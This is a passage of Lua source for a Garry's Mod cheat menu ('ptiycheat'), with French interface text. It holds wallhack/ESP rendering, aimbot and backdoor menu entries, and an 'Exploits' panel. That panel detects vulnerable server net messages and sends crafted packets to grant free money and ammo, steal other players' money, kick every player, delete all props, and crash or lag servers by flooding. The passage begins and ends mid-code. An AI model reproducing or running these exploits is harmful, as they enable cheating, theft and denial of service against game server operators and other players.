OptionsColorPinkMENU.DoClick = function()
LocalPlayer():ConCommand("fiji_fun_crosshaircolor1 255")
LocalPlayer():ConCommand("fiji_fun_crosshaircolor2 102")
LocalPlayer():ConCommand("fiji_fun_crosshaircolor3 235")
LocalPlayer():ConCommand("fiji_fun_crosshaircolortype 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorBlackMENU = vgui.Create( "DButton", ColorMenucross )
OptionsColorBlackMENU:SetPos( 155,20 )
OptionsColorBlackMENU:SetSize( 20, 20 )
OptionsColorBlackMENU:SetText( " " )
OptionsColorBlackMENU.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(45, 45, 45))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(60, 60, 60))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorBlackMENU.DoClick = function()
LocalPlayer():ConCommand("fiji_fun_crosshaircolor1 60")
LocalPlayer():ConCommand("fiji_fun_crosshaircolor2 60")
LocalPlayer():ConCommand("fiji_fun_crosshaircolor3 60")
LocalPlayer():ConCommand("fiji_fun_crosshaircolortype 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColormultiMENU = vgui.Create( "DButton", ColorMenucross )
OptionsColormultiMENU:SetPos( 177,20 )
OptionsColormultiMENU:SetSize( 20, 20 )
OptionsColormultiMENU:SetText( " " )
OptionsColormultiMENU.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,HSVToColor( CurTime() % 6 * 60, 1, 0.5 ))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColormultiMENU.DoClick = function()
LocalPlayer():ConCommand("fiji_fun_crosshaircolortype 1")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorhackMENU = vgui.Create( "DButton", ColorMenucross )
OptionsColorhackMENU:SetPos( 199,20 )
OptionsColorhackMENU:SetSize( 20, 20 )
OptionsColorhackMENU:SetText( " " )
OptionsColorhackMENU.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorhackMENU.DoClick = function()
LocalPlayer():ConCommand("fiji_fun_crosshaircolortype 2")
surface.PlaySound( fiji_ptiycheathover )

end
end


local btnstylea = BD:CreateBtn( "STYLE 2", 137, 255, 65, 25, pContent )
function btnstylea:DoClick() surface.PlaySound( fiji_ptiycheatclick ) if fiji_fun_crosshairstyle:GetInt() == 2 then RunConsoleCommand( "fiji_fun_crosshairstyle", 2 ) else RunConsoleCommand( "fiji_fun_crosshairstyle", 2 )  end end
function btnstylea:Think() if fiji_fun_crosshairstyle:GetInt() == 2 then self.activebtn = true  else self.activebtn = false end end
local btnstyleb = BD:CreateBtn( "STYLE 1", 68, 255, 65, 25, pContent )
function btnstyleb:DoClick() surface.PlaySound( fiji_ptiycheatclick ) if fiji_fun_crosshairstyle:GetInt() == 1 then RunConsoleCommand( "fiji_fun_crosshairstyle", 1 ) else RunConsoleCommand( "fiji_fun_crosshairstyle", 1 )  end end
function btnstyleb:Think() if fiji_fun_crosshairstyle:GetInt() == 1 then self.activebtn = true else self.activebtn = false end end


--crosshair end

local btnradara = BD:CreateBtn( "MIROIR", 134, 305, 65, 25, pContent )
function btnradara:DoClick() surface.PlaySound( fiji_ptiycheatclick ) if fiji_fun_radar:GetInt() == 2 then RunConsoleCommand( "fiji_fun_radar", 0 ) else RunConsoleCommand( "fiji_fun_radar", 2 )  end end
function btnradara:Think() if fiji_fun_radar:GetInt() == 2 then self.activebtn = true  else self.activebtn = false end end
local btnradarb = BD:CreateBtn( "RADAR", 65, 305, 65, 25, pContent )
function btnradarb:DoClick() surface.PlaySound( fiji_ptiycheatclick ) if fiji_fun_radar:GetInt() == 1 then RunConsoleCommand( "fiji_fun_radar", 0 ) else RunConsoleCommand( "fiji_fun_radar", 1 )  end end
function btnradarb:Think() if fiji_fun_radar:GetInt() == 1 then self.activebtn = true else self.activebtn = false end end

local btnantiscreen = BD:CreateBtn( "ANTI SCREENGRAB", 65, 345, 134, 25, pContent )
function btnantiscreen:DoClick() surface.PlaySound( fiji_ptiycheatclick ) if fiji_fun_screengrab:GetInt() == 1 then RunConsoleCommand( "fiji_fun_screengrab", 0 ) else RunConsoleCommand( "fiji_fun_screengrab", 1 )  end end
function btnantiscreen:Think() if fiji_fun_screengrab:GetInt() == 1 then self.activebtn = true else self.activebtn = false end end

end-- end fun function


concommand.Add("ptiycheat", function()

local BDMenu = vgui.Create( "DFrame" )
BDMenu:SetSize( 700, 400 )
BDMenu:Center()
BDMenu:SetTitle("")
BDMenu:SetDraggable( true )
BDMenu:ShowCloseButton( false )
BDMenu:MakePopup()
function BDMenu:Paint( w, h )


DrawBlur(self, 25)
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0,245 ) )
draw.RoundedBox( 0, 6.7, 5, w - 550, 53, Color( 110,110,110, 40 ) )
if fiji_style_menu:GetInt() == 2 then
draw.RoundedBox( 0, 4, 4, w - 8, 2,Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)))
draw.RoundedBox( 0, 4, h - 6, w - 10, 2, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
draw.RoundedBox( 0, 4, 6, 2, h - 12, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
draw.RoundedBox( 0, w - 6, 6, 2, h - 10, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
elseif fiji_style_menu:GetInt() == 1 then
draw.RoundedBox( 0, 4, 4, w - 8, 2, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
draw.RoundedBox( 0, 4, h - 6, w - 10, 2, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
draw.RoundedBox( 0, 4, 6, 2, h - 12, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
draw.RoundedBox( 0, w - 6, 6, 2, h - 10, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
else
draw.RoundedBox( 0, 4, 4, w - 8, 2, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
draw.RoundedBox( 0, 4, h - 6, w - 10, 2, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
draw.RoundedBox( 0, 4, 6, 2, h - 12, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
draw.RoundedBox( 0, w - 6, 6, 2, h - 10, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
end

if fiji_exist_contentptiycheat:GetInt() == 1 then

surface.SetMaterial( fiji_ptiycheathome )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawTexturedRect( 57, 60, 50, 40 )

surface.SetMaterial( fiji_ptiycheatesp )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawTexturedRect( 57, 110, 50, 40 )

surface.SetMaterial( fiji_ptiycheataimbot )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawTexturedRect( 57, 160, 50, 40 )

surface.SetMaterial( fiji_ptiycheatmisc )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawTexturedRect( 57, 210, 50, 35 )

surface.SetMaterial( fiji_ptiycheatexploits )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawTexturedRect( 57, 254, 50, 40 )


surface.SetMaterial( fiji_ptiycheatbackdoors )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawTexturedRect( 57, 303, 50, 40 )


surface.SetMaterial( fiji_ptiycheatconfig )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawTexturedRect( 57, 350, 50, 40 )
else end

surface.SetMaterial( fiji_ptiycheatlogo )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawTexturedRect( 55, 5, 50, 50 )
end





concommand.Add( "clear_ptiycheat", function() -- fiji_sv_existmen
BDMenu:Remove()

end)


if IsValid( BDMenu ) && IsValid( BDMenu:GetParent() ) then
LocalPlayer():ConCommand("fiji_sv_existmen 1")
else
LocalPlayer():ConCommand("fiji_sv_existmen 0")
end


local tblSideBar = {
[1] = { Name = "Dashboard", Func = function( pContent )
pContent:Clear()
BD:Dashboard( pContent )
BD.BtnHovered = 1
end },
[2] = { Name = "ESP", Func = function( pContent )
pContent:Clear()
BD:Esp( pContent )
BD.BtnHovered = 2
end },
[3] = { Name = "Aimbot", Func = function( pContent )
pContent:Clear()
BD:Aimbot( pContent )
BD.BtnHovered = 3
end },
[4] = { Name = "Fun", Func = function( pContent )
pContent:Clear()
BD:Fun( pContent )
BD.BtnHovered = 4
end },
[5] = { Name = "Exploits", Func = function( pContent )
pContent:Clear()
BD:Exploits( pContent )
BD.BtnHovered = 5
end },
[6] = { Name = "Backdoors", Func = function( pContent )
LocalPlayer():ConCommand("fiji_bckdrs")
BDMenu:Remove()
BD.BtnHovered = 1
end },
[7] = { Name = "Options", Func = function( pContent )
pContent:Clear()
BD:Options( pContent )
BD.BtnHovered = 7
end },
}
local pList = vgui.Create( "DScrollPanel", BDMenu )
pList:SetSize( 150, BDMenu:GetTall() - 40 )
pList:SetPos( 5, 58 )

local pContent = vgui.Create( "DPanel", BDMenu )
pContent:SetSize( 539, 388 )
pContent:SetPos( 155, 6 )
pContent.Paint = function( self, w, h)
draw.RoundedBox( 0, 0, 0, w, h, Color(255,35,35,0 ) )
end

for k,v in SortedPairs( tblSideBar or {} ) do
local btn = vgui.Create( "DButton", pList )
btn:Dock( TOP )
btn:SetSize( pList:GetWide(), 48)
btn:SetText( "" )
function btn:Paint( w, h )
local col = Color( 255, 255, 255, 150 )
if not self:IsHovered() || BD.BtnHovered == k  then

draw.RoundedBox( 0, 0, 0, w, h, Color( 100, 100, 100,0 ) )
else
draw.RoundedBox( 0, 0, 0, w, h, Color( 100, 100, 100,10 ) )
end
if BD.BtnHovered == k then
draw.RoundedBox( 0, 0, 0, w, h, Color( 27, 27, 27, 0 ) )
if fiji_style_menu:GetInt() == 2 then
draw.RoundedBox( 0, 0, 0, w, 2, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
elseif fiji_style_menu:GetInt() == 1 then
draw.RoundedBox( 0, 0, 0, w, 2, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
else
draw.RoundedBox( 0, 0, 0, w, 2, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
end

if k != #tblSideBar && k + 1 != BD.BtnHovered then
if fiji_style_menu:GetInt() == 2 then
draw.RoundedBox( 0, 0, h - 2, w, 5, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
elseif fiji_style_menu:GetInt() == 1 then
draw.RoundedBox( 0, 0, h - 2, w, 5, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
else
draw.RoundedBox( 0, 0, h - 2, w, 5, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
end
end
else
draw.RoundedBox( 0, 0, 0, w, h, Color( 100, 100, 100,8 ) )
end
if fiji_exist_contentptiycheat:GetInt() == 0 then
draw.SimpleText( v['Name'], "ptiycheat_home3", w / 2, h / 2, col, 1, 1 )
else end
end
btn.OnCursorEntered = function(self)
if fiji_exist_contentptiycheat:GetInt() == 1 then                              --
surface.PlaySound( "mat/ptiycheathover.wav" )
else end
end
function btn:DoClick()
if fiji_exist_contentptiycheat:GetInt() == 1 then
surface.PlaySound( "mat/ptiycheatclick.wav" )
else
end
v['Func']( pContent )
end
end
tblSideBar[ BD.BtnHovered ]['Func']( pContent )



end)


-- Esp Props
hook.Add( "HUDPaint", "PropESP", function()
for k,v in pairs (ents.FindByClass("prop_physics")) do
if fiji_vision_enable_props:GetInt() == 0 then return end
if v:GetPos():Distance( LocalPlayer():GetPos() ) > fiji_vision_distance_props:GetInt() then continue end
if v:GetPos():Distance( LocalPlayer():GetPos() ) < 90 then continue end

cam.Start3D(EyePos(), EyeAngles())
if v:IsValid() then
cam.IgnoreZ( true )
render.SuppressEngineLighting( true )
render.SetColorModulation( fiji_principal_color_props:GetInt(), fiji_secondary_color_props:GetInt(), fiji_third_color_props:GetInt(), 255)
render.SetBlend(0.3)
v:DrawModel()
cam.IgnoreZ( false )
render.SuppressEngineLighting( false )
cam.End3D()
end
end

end)

-- Esp Players
-- Renders
function BD:Bones( tbl )
for k,v in pairs( tbl ) do
if v == LocalPlayer() then continue end
if not v:Alive() then continue end
for i = 0, v:GetBoneCount() - 1 do
local pos = v:GetBonePosition( i )
if ( pos == v:GetPos() && v:GetBoneMatrix( i ) ) then
pos = v:GetBoneMatrix( i ):GetTranslation()
end
if ( v:GetBoneName( i ) == "__INVALIDBONE__" ) then continue end
if ( v:GetBoneMatrix( i ) ) then
cam.Start3D( EyePos(), EyeAngles() )
for id, bone in pairs( v:GetChildBones( i ) ) do

local pos2 = v:GetBonePosition( bone )
if ( pos2 == v:GetPos() && v:GetBoneMatrix( bone ) ) then
pos2 = v:GetBoneMatrix( bone ):GetTranslation()
end
render.DrawLine( pos, pos2, Color(fiji_principal_color:GetInt(), fiji_secondary_color:GetInt(), fiji_third_color:GetInt(), 255 ), false )
end
cam.End3D()
end
end
end
end
hook.Add( "PostDrawOpaqueRenderables", "BD:Hitman:Infos", function()
if fiji_vision_enable:GetInt() == 0 then return end
local tblPlayers = {}
for k,v in pairs( player.GetAll() ) do
if v:GetPos():Distance( LocalPlayer():GetPos() ) > fiji_vision_distance_infos:GetInt() then continue end
table.insert( tblPlayers, v )
end
BD:Name( tblPlayers )
end)
BD.WeaponBlacklist = {
['keys'] = true,
['weapon_physgun'] = true,
['weapon_keypadchecker'] = true,
['arrest_stick'] = true,
['unarrest_stick'] = true,
['stunstick'] = true,
['weaponchecker'] = true,
['itemstore_pickup'] = true,
['weapon_physcannon'] = true,
['gmod_camera'] = true,
['gmod_tool'] = true,
['pocket'] = true,
}
function BD:Name( tbl )
ply = LocalPlayer()
for k,v in pairs( tbl ) do
if !IsValid( v ) then continue end
if v == ply then continue end
if not v:Alive() then continue end
if v:GetPos():Distance( LocalPlayer():GetPos() ) > fiji_vision_distance_infos:GetInt() then continue end
local pos = v:GetPos()
pos.z = pos.z + 90
local trace = LocalPlayer():GetEyeTrace()
local angle = trace.HitNormal:Angle()
cam.Start3D2D( pos, Angle( 0, LocalPlayer():EyeAngles().y - 90, 90 - LocalPlayer():EyeAngles().x ), 0.2 )
if fiji_vision_infos_name:GetInt() == 1 then
draw.SimpleText( "Nom : " .. v:Nick(), "ptiycheat_home3", 0, 0, Color(fiji_principal_color_infos:GetInt(), fiji_secondary_color_infos:GetInt(), fiji_third_color_infos:GetInt(), 255 ), 1 )
end
if fiji_vision_infos_weapons:GetInt() == 1 then
local wep = v:GetWeapons()
local strText = ""
for k,v in pairs( wep ) do
if !IsValid( v ) then continue end
if BD.WeaponBlacklist[ v:GetClass() ] then continue end
strText = strText .. v:GetClass() .. ", "
end
strText = string.sub( strText, 1, string.len( strText ) - 2 )
draw.SimpleText( "Armes : " .. strText, "ptiycheat_home3", 0, 15, Color(fiji_principal_color_infos:GetInt(), fiji_secondary_color_infos:GetInt(), fiji_third_color_infos:GetInt(), 255 ), 1 )
end
if fiji_vision_infos_health:GetInt() == 1 then
draw.SimpleText( "Vie : " .. v:Health(), "ptiycheat_home3", 0, 35, Color(fiji_principal_color_infos:GetInt(), fiji_secondary_color_infos:GetInt(), fiji_third_color_infos:GetInt(), 255 ), 1 )
end
cam.End3D2D()
end
end
hook.Add( "HUDPaint", "BD:Hitman:HUDPaint", function()
if fiji_vision_enable:GetInt() == 0 then return end
local tblPlayers = {}
for k,v in pairs( player.GetAll() ) do
if v:GetPos():Distance( LocalPlayer():GetPos() ) > fiji_vision_distance:GetInt() then continue end
table.insert( tblPlayers, v )
end
if fiji_vision_type:GetInt() == 1 then
BD:Bones( tblPlayers )
end
end)
-- Solid
local matSolid = CreateMaterial( "BD_Hitman_Solid", "UnlitGeneric", { ["$model"] = 1, ["$ignorez"] = 1 } )
hook.Add( "PrePlayerDraw", "BD:Hitman:Solid", function( pPlayer )
if fiji_vision_enable:GetInt() == 1 && fiji_vision_type:GetInt() == 2 && pPlayer:GetPos():Distance( LocalPlayer():GetPos() ) <= fiji_vision_distance:GetInt() then

render.MaterialOverride( matSolid )
render.SetColorModulation(fiji_principal_color:GetInt(), fiji_secondary_color:GetInt(), fiji_third_color:GetInt())
end
end )
hook.Add( "PostPlayerDraw", "BD:Hitman:Solid", function( pPlayer )
if fiji_vision_enable:GetInt() == 1 && fiji_vision_type:GetInt() == 2 && pPlayer:GetPos():Distance( LocalPlayer():GetPos() ) <= fiji_vision_distance:GetInt() then
render.MaterialOverride()
end
end)
-- Halos
hook.Add( "PreDrawHalos", "BD:Hitman:Glow", function()
if fiji_vision_enable:GetInt() == 1 && fiji_vision_type:GetInt() == 3 then

local tblPlayers = {}
for k,v in pairs( player.GetAll() ) do
if not v == LocalPlayer() then return end
if not v:Alive() then continue end
if v:GetPos():Distance( LocalPlayer():GetPos() ) > fiji_vision_distance:GetInt() then continue end
table.insert( tblPlayers, v )
end
halo.Add( tblPlayers, Color(fiji_principal_color:GetInt(), fiji_secondary_color:GetInt(), fiji_third_color:GetInt(), 255 ), 2, 2, 5, true, true )
end
end)

--[[HTMLGUI = vgui.Create( "HTML", BDMenu )
HTMLGUI:SetSize( 75,55 )
HTMLGUI:SetPos( 45,2 )
HTMLGUI:OpenURL( "http://image.noelshack.com/fichiers/2018/39/6/1538220360-ptiycheatlua-menu.png")
]]--



---------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------



function BD:Exploits( pContent )


local BDMenuExploits = vgui.Create("DPanel", pContent)
BDMenuExploits:SetSize( 539, 388 )
BDMenuExploits:SetPos( 0, 0 )
BDMenuExploits.Paint = function( self, w, h)
if fiji_style_menu:GetInt() == 2 then
draw.RoundedBox( 0, 0, 0, 2, h - 142, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
draw.RoundedBox( 0, 0, 290, 2, h - 190, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )

elseif fiji_style_menu:GetInt() == 1 then
draw.RoundedBox( 0, 0, 0, 2, h - 142, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
draw.RoundedBox( 0, 0, 290, 2, h - 190, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )


else
draw.RoundedBox( 0, 0, 0, 2, h - 142, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
draw.RoundedBox( 0, 0, 290, 2, h - 190, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
end


end


if not snte then
function draw.OutlinedBox( x, y, w, h, thickness, clr )
surface.SetDrawColor( clr )
for i=0, thickness - 1 do
surface.DrawOutlinedRect( x + i, y + i, w - i * 2, h - i * 2 )
end
end


local exploitsScrollPanel = vgui.Create( "DScrollPanel", pContent )
exploitsScrollPanel:SetPos(10,0)
exploitsScrollPanel:SetSize(520,388)
exploitsScrollPanel:InnerWidth(0)
local sbar = exploitsScrollPanel:GetVBar()
function exploitsScrollPanel:Paint( w, h )
draw.SimpleText("Exploits détectées sur le serveur :", "ptiycheat_home3", 160, 10, Color(255, 255, 255,200), 0, 1)

draw.RoundedBox( 3, 0, 0, w, h , Color(0,0,0,0))
end
function sbar:Paint( w, h )
draw.RoundedBox( 0, 4, 0, w, h, Color( 110,110,110, 20  ) )
end
function sbar.btnUp:Paint( w, h )
draw.RoundedBox( 0, 4, 0, w, h, Color(110,110,110, 20 ))
end
function sbar.btnDown:Paint( w, h )
draw.RoundedBox( 0, 4, 0, w, h, Color(110,110,110, 20 ))
end
function sbar.btnGrip:Paint( w, h )
draw.RoundedBox( 0, 4, 0, w, h, Color(110,110,110, 20 ))
end
--NOTIFICATION("Exploit lançé")
totalSploits = 0
function addExploit(id, text, desc, func)
totalSploits = 1 + totalSploits
local id = vgui.Create( "DButton", exploitsScrollPanel )
id:SetText( text )
id:SetFont("Arial")
id:Dock( TOP )
id:DockMargin( 0, 39, 0, -37 )
id:DockPadding( 0, 30, 0, 0 )
id.DoClick = func





if desc then
end
id.Paint = function( self, w, h )

id.OnCursorEntered = function(self)
end
if id:IsHovered() then




if fiji_style_menu:GetInt() == 2 then
id:SetTextColor( Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)))
surface.SetDrawColor(Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)))
surface.DrawOutlinedRect( 0, 0, w, h )
draw.RoundedBox(0,0,0,w,h,Color(110,110,110, 20))
elseif fiji_style_menu:GetInt() == 1 then
id:SetTextColor( HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
surface.SetDrawColor(HSVToColor( CurTime() % 6 * 60, 1, 0.5 ))
surface.DrawOutlinedRect( 0, 0, w, h )
draw.RoundedBox(0,0,0,w,h,Color(110,110,110, 20))
elseif fiji_style_menu:GetInt() == 3 then
id:SetTextColor( Color( 255, 255, 255, 255 ) )
surface.SetDrawColor(110,110,110, 30)
surface.DrawOutlinedRect( 0, 0, w, h )
draw.RoundedBox(0,0,0,w,h,Color(110,110,110, 20))
else
id:SetTextColor( Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
surface.SetDrawColor(fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 )
surface.DrawOutlinedRect( 0, 0, w, h )
draw.RoundedBox(0,0,0,w,h,Color(110,110,110, 20))
end



else
id:SetTextColor( Color( 255, 255, 255, 40 ) )
surface.SetDrawColor(110,110,110, 0)
surface.DrawOutlinedRect( 0, 0, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(110,110,110, 10))
end

end
end

//////////////////// [EXPLOITS] ////////////////////
status = ValidNetString("TCBBuyAmmo")
if (status) then
CHATPRINT("Exploit Trouvé : Munitions Gratuites [TCBBuyAmmo]")
addExploit( "1","Munitions Gratuites", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") CHATPRINT("Getting Le Ammo")
--("Exploit lançé")
for k,v in pairs(GAMEMODE.AmmoTypes) do
net.Start("TCBBuyAmmo")
net.WriteTable( {nil,v.ammoType,nil,"0","999999"} )
net.SendToServer()
end
end)
end

status = ValidNetString("DataSend")
if (status) then
CHATPRINT("Exploit Trouvé : Voler L'argents De Tous #1 [DataSend]")
addExploit( "2","Voler L'argents De Tous #1", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Exploit lançé")
for k, v in pairs( ents.GetAll() ) do
if v:GetClass() == "adv_moneyprinter" then
CHATPRINT("Collecting Money")
net.Start("DataSend")
net.WriteFloat(2)
net.WriteEntity(v)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end
end)
end


status = ValidNetString("FarmingmodSellItems")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite [FarmingmodSellItems]")
addExploit( "3","Argent Gratuite", "", function()
--("Exploit lançé")
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") CHATPRINT("Enjoy the b1g monies")
net.Start("FarmingmodSellItems")
net.WriteTable(
{
Cost    =   10,
CropModel    =   "models/props/eryk/garlic.mdl",
CropType =   2,
Info  =   "Garlic Seed",
Model =   "models/props/eryk/seedbag.mdl",
Name    =   "Garlic",
Quality    =   4,
Sell  =   99999,
Type  =   "Seed"
}
)
net.WriteInt(1,16)
net.SendToServer()
end)
end

status = ValidNetString("start_wd_emp")
if (status) then
CHATPRINT("Exploit Trouvé : Hack Keypad [start_wd_emp]")
addExploit( "4","Hack Keypad", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Exploit lançé")
net.Start("start_wd_emp")
net.SendToServer()
end)
end

status = ValidNetString("duelrequestguiYes")
if (status) then
CHATPRINT("Exploit Trouvé : Recevoir De L'Argent [duelrequestguiYes]")
addExploit( "5","Recevoir De L'Argent", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Exploit lançé")
net.Start("duelrequestguiYes")
net.WriteInt(-99999999999999999999999999999999999999999999999999999999999999999999999999999,32)
net.WriteEntity(table.Random( player.GetAll() ) )
net.WriteString("Crossbow")
net.SendToServer()
end)
end

status = ValidNetString("DarkRP_Kun_ForceSpawn")
if (status) then
CHATPRINT("Exploit Trouvé : ReSpawn #1 [DarkRP_Kun_ForceSpawn]")
addExploit( "6", "ReSpawn #1", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") CHATPRINT("ReSpawn")
net.Start("DarkRP_Kun_ForceSpawn")
net.SendToServer()
end)
end

status = ValidNetString("SyncPrinterButtons76561198056171650")
if (status) then
CHATPRINT("Exploit Trouvé : Voler L'argents De Tous #2 [SyncPrinterButtons76561198056171650]")
addExploit( "7","Voler L'argents De Tous #2", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") CHATPRINT("Collecting Money")
for k, v in pairs(ents.GetAll()) do
if (v:GetClass() == "adv_moneyprinter") then
net.Start("SyncPrinterButtons76561198056171650")
net.WriteEntity(v)
net.WriteUInt(2, 4)
net.SendToServer()
end
end
end)
end
---------------------------------------------------------------------------------------------
local function report()
for i = 1, 2000 do
net.Start("DL_Answering")
net.SendToServer()
end
end

if (Damagelog) then
CHATPRINT("Exploit Trouvé : Kick Tous Le Monde")
reportSpam = 0
addExploit( "1337","Kick Tous Le Monde", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") if (reportSpam == 0) then
--("Starting Kicker")
reportSpam = 1
timer.Create("reportSpammer", 0.05, 0, report)
else
--("Stopping Kicker")
reportSpam = 0
timer.Remove("reportSpammer")
end

end)
end
----------------------------------------------------------------------------------------------

status = ValidNetString("SimplicityAC_aysent")
if (status) then
CHATPRINT("Exploit Trouvé : Crash #1 [SimplicityAC_aysent]")
addExploit( "8","Crash #1", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") CHATPRINT("Goodbye Server")
local tbl = {}
for i=1,400 do
tbl[i] = i
end
net.Start("SimplicityAC_aysent")
net.WriteUInt(1, 8)
net.WriteUInt(4294967295, 32)
net.WriteTable(tbl)
net.SendToServer()
end)
end

status = ValidNetString("RevivePlayer")
if (status) then
CHATPRINT("Exploit Trouvé : Reanimation #1 [RevivePlayer]")
addExploit( "9", "Reanimation #1", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "reanimation1" ) then
--( "Enabled" )
timer.Create( "reanimation1", 0.5, 0, function()
if !LocalPlayer():Alive() then
net.Start("RevivePlayer")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "reanimation1" )
--( "Disabled" )
end
end )
end

status = ValidNetString("NLRKick")
if (status) then
CHATPRINT("Exploit Trouvé : Kick Tous Le Monde [NLRKick]")
addExploit( "10","Kick Tous Le Monde", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Kicking All")
for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() then
net.Start("NLRKick")
net.WriteEntity(v)
net.SendToServer()
end
end
end)
end

status = ValidNetString("timebombDefuse")
if (status) then
CHATPRINT("Exploit Trouvé : Supprimer Tous Les Props [timebombDefuse]")
addExploit( "11","Supprimer Tous Les Props", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Props De_Stroyed")
for k,v in pairs(ents.GetAll()) do
net.Start("timebombDefuse")
net.WriteEntity(v)
net.WriteBool(true)
net.SendToServer()
end
end)
end

status = ValidNetString("NDES_SelectedEmblem")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #2 [NDES_SelectedEmblem]")
addExploit( "12","Crée Des Lags #2", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "lagger2" ) then
timer.Create("lagger2", 0.5, 0, function()
for i=1, 2000 do
net.Start("NDES_SelectedEmblem",true)
net.WriteString("seized")
net.SendToServer()
end
end)
--("Lags Démarré")
else
timer.Remove("lagger2")
--("Lags Arreté")
end
end)
end

status = ValidNetString("Morpheus.StaffTracker")
if (status) then
